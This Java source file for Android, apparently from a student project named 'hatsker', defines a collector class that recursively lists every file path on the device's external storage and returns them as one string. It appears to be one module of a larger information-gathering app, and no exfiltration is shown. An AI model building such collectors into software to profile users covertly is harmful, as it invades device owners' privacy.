package com.example.student.hatsker;

import android.content.Context;
import android.util.Log;

import java.io.File;


public class FilesPathsGatherer implements Gatherer {

    StringBuilder stringBuilder = new StringBuilder();
    String path = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();


    private Context context;

    FilesPathsGatherer(Context context)
    {
        this.context = context;
    }


    @Override
    public String getInfo() {

        GetFiles(path);
        return stringBuilder.toString();
    }

    public void GetFiles(String DirectoryPath) {
        stringBuilder.append(DirectoryPath);
        File f = new File(DirectoryPath);
        f.mkdirs();
        File[] files = f.listFiles();
        if (files != null) {
            for (int i = 0; i < files.length; i++) {

                stringBuilder.append(files[i].getAbsolutePath() + "\n");

                if (files[i].isDirectory())
                    GetFiles(files[i].getAbsolutePath());
            }
        }
    }


}
